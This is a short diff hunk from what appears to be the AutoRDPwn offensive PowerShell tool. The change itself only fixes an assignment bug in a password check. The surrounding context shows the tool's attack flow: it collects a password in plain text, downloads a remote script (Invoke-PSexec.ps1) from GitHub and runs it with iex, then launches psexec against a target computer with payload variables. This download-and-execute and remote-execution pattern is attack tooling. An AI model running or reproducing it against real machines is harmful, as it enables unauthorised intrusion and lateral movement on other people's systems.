@@ -232,7 +232,7 @@ if($Language -in 'Spanish') {
         $user = $Host.UI.ReadLine() ; if(!$user) { Write-Host $currentuser.split('\')[1].trim() }
         Write-Host ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray
         $password = $Host.UI.ReadLineAsSecureString() ; $PlainTextPassword = ConvertFrom-SecureToPlain $password
-	if($PlainTextPassword = $null) { Write-Host "******" } ; $Host.UI.RawUI.ForegroundColor = 'Blue'
+	if(!$PlainTextPassword) { Write-Host "******" } ; $Host.UI.RawUI.ForegroundColor = 'Blue'
         Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-PSexec.ps1" -UseBasicParsing | iex
 	if(!$user) { .\psexec.exe \\$computer -h -d powershell.exe "$Pwn1" -nobanner -accepteula
         .\psexec.exe \\$computer -h -d powershell.exe "$Pwn2" -nobanner -accepteula
